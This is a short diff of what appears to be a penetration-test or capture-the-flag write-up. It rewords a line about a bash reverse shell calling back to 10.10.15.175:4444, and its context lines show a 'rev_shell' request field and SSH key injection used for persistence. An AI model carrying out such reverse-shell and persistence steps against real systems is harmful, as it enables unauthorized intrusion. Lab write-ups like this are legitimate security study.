@@ -20,7 +20,7 @@
 			"serverId":"rev_shell"
 		}'
 			
-Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
+Establishing a callback to `10.10.15.175:4444` via bash interactive shell.
 
 ## Persistence and Stabilization
 - SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
